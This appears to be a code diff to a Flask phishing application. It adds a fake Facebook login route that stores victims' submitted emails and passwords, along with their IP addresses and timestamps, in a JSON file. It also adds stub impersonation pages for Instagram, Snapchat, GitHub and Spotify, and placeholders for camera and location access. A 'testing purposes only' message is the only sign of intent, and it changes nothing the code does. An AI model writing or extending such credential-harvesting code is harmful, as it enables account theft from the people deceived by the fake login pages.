@@ -146,6 +146,64 @@ def google_login():
     
     return render_template('idp/google.html')
 
+@app.route('/facebook-login', methods=['GET', 'POST'])
+def facebook_login():
+    if request.method == 'POST':
+        email = request.form['email']
+        password = request.form['pass']
+        ip = request.remote_addr
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+        data = {
+            'email': email,
+            'password': password,
+            'ip': ip,
+            'timestamp': timestamp
+        }
+
+        save_to_json('data/facebook_data.json', data)
+
+        return "Facebook login data saved (for testing purposes only)."
+
+    return render_template('idp/facebook.html')
+
+@app.route('/login-options')
+@login_required
+def login_options():
+    return render_template('/options/login_options.html')
+
+@app.route('/camera')
+@login_required
+def camera():
+    return "Camera Access Page (To be developed)"
+
+
+@app.route('/location')
+@login_required
+def location():
+    return "Location Access Page (To be developed)"
+
+@app.route('/other-options')
+@login_required
+def other_options():
+    return "Other Options Page (To be developed)"
+
+def instagram_login():
+    return "Instagram login page (testing purpose)."
+
+
+@app.route('/snapchat-login', methods=['GET', 'POST'])
+def snapchat_login():
+    return "Snapchat login page (testing purpose)."
+
+@app.route('/github-login', methods=['GET', 'POST'])
+def github_login():
+    return "GitHub login page (testing purpose)."
+
+@app.route('/spotify-login', methods=['GET', 'POST'])
+def spotify_login():
+    return "Spotify login page (testing purpose)."
+
 def save_to_json(filename, data):
     os.makedirs(os.path.dirname(filename), exist_ok=True)
     if os.path.exists(filename):
